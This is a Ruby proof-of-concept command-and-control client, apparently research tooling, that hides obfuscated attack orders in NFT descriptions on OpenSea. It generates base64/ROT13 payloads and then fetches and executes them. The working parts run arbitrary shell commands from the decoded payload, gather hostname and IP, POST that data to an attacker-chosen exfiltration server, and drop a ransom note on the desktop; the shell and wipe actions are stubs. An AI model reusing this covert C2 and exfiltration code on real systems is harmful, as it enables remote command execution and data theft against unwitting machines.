#!/usr/bin/ruby
#mFT - Malicious Fungible Token
#Mauro Eldritch @ DC5411 - 2023
require_relative 'config.rb'
require 'net/http'
require 'uri'
require 'json'
require 'socket'
require 'optparse'
require 'base64'
require 'colorize'
require 'terminal-table'

def banner()
    bannertext = """
                                                                       
          _____ _____           _ _ _     _   ___    _____ _ _         _   
    _____|   __|_   _|   ___   | | | |___| |_|_  |  |     | |_|___ ___| |_ 
   |     |   __| | |    |___|  | | | | -_| . |_  |  |   --| | | -_|   |  _|
   |_|_|_|__|    |_|           |_____|___|___|___|  |_____|_|_|___|_|_|_|                                                                   
                                      mFT - Client v0.01 - Mauro Eldritch        
    """
    puts bannertext.light_red
end

#ROT-13 function by zhisme
def rot13(payload)
    payload.chars.map do |c|
        if c.ord.between?('A'.ord, 'M'.ord) || c.ord.between?('a'.ord, 'm'.ord)
            c.ord + 13
        elsif c.ord.between?('n'.ord, 'z'.ord) || c.ord.between?('N'.ord, 'Z'.ord)
            c.ord - 13
        else 
            c.ord
        end
    end.map(&:chr).join
end

def exec_c2_order(order, target="")
    case order
    when "ip_address"
        puts "[🎯] Using #{target} as a target data exfiltration server.".light_green
        $ex_server = target.to_s
    when "actions"
        commands = target.split(",")
        commands.each do | command |
            case command
            when "id"
                cmdid = "[🆔] Hostname: #{Socket.gethostname}."
                cmdip = "[🆔] IP Address: #{Socket.ip_address_list.find { |ai| ai.ipv4? && !ai.ipv4_loopback? }.ip_address}."
                $cmdinfo += cmdid + "\n" + cmdip + "\n"
                puts cmdid.light_green
                puts cmdip.light_green
            when "exfil"
                cmdexf = "[📩] Attempting exfiltration to #{$ex_server}..."
                $cmdinfo += cmdexf + "\n"
                exfil_data = Base64.encode64($cmdinfo)
                uri = URI.parse("#{$ex_server}")
                request = Net::HTTP::Post.new(uri)
                request.set_form_data(
                    "exfil_data" => exfil_data
                )
                req_options = { }
                response = Net::HTTP.start(uri.hostname, uri.port, req_options) do |http|
                    http.request(request)
                end
                puts cmdexf.light_green
                puts "[📩] Received HTTP Response Code #{response.code}.".light_green              
            #This is a PoC, so no destructing capabilities are given.
            #Commands encrypt, shell and wipe won't do anything.
            when "encrypt"
                puts "[🔒] [FAKE] Encryption cycle started. Ransom note created.".light_green
                begin
                    desktop = ""
                    if Dir.exist?(File.expand_path('~') + "/Desktop")
                        desktop = "#{File.expand_path('~')}/Desktop"
                    elsif Dir.exist?(File.expand_path('~') + "/Escritorio")
                        desktop = "#{File.expand_path('~')}/Escritorio"
                    else
                        desktop = "/tmp"
                    end
                    File.open("#{desktop}/your_files_are_encrypted.txt", "w+") { |file| file.write("Your files are encrypted. Send us 2 CapybaraCoins to decrypt. Capybaracoins are the official uruguayan currency. $2 coins feature a nice and friendly capybara, AND WE WANT ALL OF THEM. NOW.") }
                rescue => e
                    puts "Exception: #{e}"
                end
            when "shell"
                puts "[💻] [FAKE] Reverse Shell Opened.".light_green
            when "wipe"
                puts "[🧽] [FAKE] Filesystem wiped.".light_green
            end
        end
    when "code"
        puts "[💉] Running custom code:".light_green
        target.split(";").each do | line |
            cmdline = `#{line}`
            command_result = "#{line}: #{cmdline}"
            $cmdinfo += "[💉] #{command_result}\n"
            puts "\t\t>#{command_result}".light_green
        end
    end
end

def explain_c2_order(order, target="")
    case order
    when "ip_address"
        puts "[🎯] Will use #{target} as a target C2 Server.".light_yellow
    when "actions"
        commands = target.split(",")
        commands.each do | command |
            case command
            when "id"
                puts "[🆔] Will attempt to uniquely identify the host.".light_yellow
            when "exfil"
                puts "[📩] Will attempt to exfiltrate data to target host.".light_yellow
            when "encrypt"
                puts "[🔒] Will attempt to encrypt data from infected host.".light_yellow
            when "shell"
                puts "[💻] Will attempt to open a reverse shell against target host.".light_yellow
            when "wipe"
                puts "[🧽] Will attempt to wipe data from infected host.".light_yellow
            end
        end
    when "code"
        puts "[💉] Will attempt to run the code below:".light_yellow
        target.split(";").each do | line | 
            puts "\t\t#{line}".light_green
        end
    end
end

def generate_payload()
    puts "Generating a new payload:\n".light_red
    print "[?] C2 address (with http:// or https://): ".light_red
    c2_addr = gets.chomp
    print "\n[?] Custom Unix commands (separated by ;): ".light_red
    commands = gets.chomp
    puts "\n[*] Available Actions: id, exfil, shell, encrypt, wipe"
    print "[?] Actions (separated by ,): ".light_red
    actions = gets.chomp
    puts "[*] Payload generated".light_red
    payload = "ip_address=#{c2_addr.chomp}&code=#{commands.chomp}&actions=#{actions.chomp}"
    encoded_payload = "b64|#{Base64.encode64(payload).gsub("\n","")}"
    rot13_encoded_payload = "r13|#{rot13(encoded_payload[4..])}"
    puts "[>] Plain:  #{payload}".light_red
    puts "[>] Base64: #{encoded_payload}".light_red
    puts "[>] ROT13 + Base64: #{rot13_encoded_payload}".light_red
end

def execute_nft(nft="", nftid="", blockchain="")
    if blockchain.to_s == ""
        blockchain = $mal_blockchain
    end
    uri = URI.parse("https://api.opensea.io/api/v2/chain/#{blockchain}/contract/#{nft}/nfts/#{nftid}")
    request = Net::HTTP::Get.new(uri)
    request["Accept"] = "application/json"
    request["X-Api-Key"] = $sea_apikey
    req_options = { use_ssl: uri.scheme == "https" }
    response = Net::HTTP.start(uri.hostname, uri.port, req_options) do |http|
        http.request(request)
    end
    json_body = JSON.parse(response.body)
    name = json_body['nft']['name']
    description = json_body['nft']['description']
    meta_url = json_body['nft']['metadata_url']
    puts "Execution report for NFT #{nftid} [#{nft}]".light_red
    puts "Blockchain: #{blockchain}.".light_red
    if meta_url.to_s != ""
        puts "Metadata URL: #{meta_url}.".light_blue
    end
    if description[0..3] == "b64|"
        decoded_description = Base64.decode64(description[4..])
    elsif description[0..3] == "r13|"
        puts "Encoding: ROT13 + Base64 detected.".light_blue
        decoded_description = Base64.decode64(rot13(description[4..]))
    else
        puts "[!] Fatal: Unknown encoding.".light_red
        exit(1)
    end
    actions = decoded_description.split("&")
    actions.each do | action |
        order = action.split("=")[0]
        target = action.split("=")[1]
        exec_c2_order(order, target)
    end
end
    
def decode_nft(nft="", nftid="", blockchain="")
    if blockchain.to_s == ""
        blockchain = $mal_blockchain
    end
    rows = []
    uri = URI.parse("https://api.opensea.io/api/v2/chain/#{blockchain}/contract/#{nft}/nfts/#{nftid}")
    request = Net::HTTP::Get.new(uri)
    request["Accept"] = "application/json"
    request["X-Api-Key"] = $sea_apikey
    req_options = { use_ssl: uri.scheme == "https" }
    response = Net::HTTP.start(uri.hostname, uri.port, req_options) do |http|
        http.request(request)
    end
    json_body = JSON.parse(response.body)
    name = json_body['nft']['name']
    description = json_body['nft']['description']
    meta_url = json_body['nft']['metadata_url']
    puts "Report for NFT #{nftid} [#{nft}]".light_blue
    puts "Blockchain: #{blockchain}.".light_blue
    if meta_url.to_s != ""
        puts "Metadata URL: #{meta_url}.".light_blue
    end
    if description[0..3] == "b64|"
        puts "Encoding: Base64 detected.".light_blue
        decoded_description = Base64.decode64(description[4..])
    elsif description[0..3] == "r13|"
        puts "Encoding: ROT13 + Base64 detected.".light_blue
        decoded_description = Base64.decode64(rot13(description[4..]))
    else
        puts "[!] Fatal: Unknown encoding.".light_red
        exit(1)
    end
    rows << [name, decoded_description]
    table = Terminal::Table.new :headings => ['Name', 'Decoded description'], :rows => rows
    puts table
    puts "\n[💡] Action plan:\n".light_yellow
    actions = decoded_description.split("&")
    actions.each do | action |
        order = action.split("=")[0]
        target = action.split("=")[1]
        explain_c2_order(order, target)
    end
end

def read_nft(nft="", nftid="", blockchain="")
    if blockchain.to_s == ""
        blockchain = $mal_blockchain
    end
    rows = []
    uri = URI.parse("https://api.opensea.io/api/v2/chain/#{blockchain}/contract/#{nft}/nfts/#{nftid}")
    request = Net::HTTP::Get.new(uri)
    request["Accept"] = "application/json"
    request["X-Api-Key"] = $sea_apikey
    req_options = { use_ssl: uri.scheme == "https" }
    response = Net::HTTP.start(uri.hostname, uri.port, req_options) do |http|
        http.request(request)
    end
    json_body = JSON.parse(response.body)
    name = json_body['nft']['name']
    collection = json_body['nft']['collection']
    description = json_body['nft']['description']
    flagged = json_body['nft']['is_suspicious']
    rows << [name, collection, description, flagged]
    table = Terminal::Table.new :headings => ['Name', 'Collection', 'Description', 'Flagged?'], :rows => rows
    puts "Report for NFT #{nftid} [#{nft}]".light_blue
    puts "Blockchain: #{blockchain}.".light_blue
    puts table
end

def read_account(account="", blockchain="")
    if blockchain.to_s == ""
        blockchain = $mal_blockchain
    end
    rows = []
    uri = URI.parse("https://api.opensea.io/api/v2/chain/#{blockchain}/account/#{account}/nfts")
    request = Net::HTTP::Get.new(uri)
    request["Accept"] = "application/json"
    request["X-Api-Key"] = $sea_apikey
    req_options = { use_ssl: uri.scheme == "https" }
    response = Net::HTTP.start(uri.hostname, uri.port, req_options) do |http|
        http.request(request)
    end
    json_body = JSON.parse(response.body)
    json_body['nfts'].each do |x|
        rows << [x['name'], x['collection'],x['description'][0..10] + "...",x['contract'], x['identifier']]
    end
    table = Terminal::Table.new :headings => ['Name', 'Collection', 'Description', 'Contract', 'Identifier'], :rows => rows
    puts "NFTs for #{account}:".light_blue
    puts "Blockchain: #{blockchain}.".light_blue
    puts table
end

def main()
    banner()
    options = {}
    begin
        OptionParser.new do |opt|
            opt.on('-g', '--generate', 'Generate a malicious payload')  { |o| options[:action] = "generate" }
            opt.on("-x ADDRESS,IDENTIFIER,BLOCKCHAIN", "--execute ADDRESS,IDENTIFIER,BLOCKCHAIN", Array, "Execute a specific NFT's malicious payload") do |list|
                options[:action] = "execute"
                options[:nft] = list[0]
                options[:nftid] = list[1]
                options[:blockchain] = list[2]
            end
            opt.on("-d ADDRESS,IDENTIFIER,BLOCKCHAIN", "--decode ADDRESS,IDENTIFIER,BLOCKCHAIN", Array, "Decode a specific NFT's malicious payload") do |list|
                options[:action] = "decode"
                options[:nft] = list[0]
                options[:nftid] = list[1]
                options[:blockchain] = list[2]
            end
            opt.on("-l ACCOUNT,BLOCKCHAIN", "--list ACCOUNT,BLOCKCHAIN", Array, "List account NFTs") do |list|
                options[:action] = "list"
                options[:account] = list[0]
                options[:blockchain] = list[1]
            end
            opt.on("-i ADDRESS,IDENTIFIER,BLOCKCHAIN", "--info ADDRESS,IDENTIFIER,BLOCKCHAIN", Array, "Get details for a specific NFT") do |list|
                options[:action] = "info"
                options[:nft] = list[0]
                options[:nftid] = list[1]
                options[:blockchain] = list[2]
            end
        end.parse!
    rescue
        puts "[!] Invalid option. Run with -h argument for help.".light_red
        exit(1)
    end
    case options[:action]
    when 'generate'
        generate_payload()
    when 'list'
        read_account(options[:account], options[:blockchain])
    when 'info'
        read_nft(options[:nft], options[:nftid], options[:blockchain])
    when 'decode'
        decode_nft(options[:nft], options[:nftid], options[:blockchain])
    when 'execute'
        execute_nft(options[:nft], options[:nftid], options[:blockchain])
    end
end

main()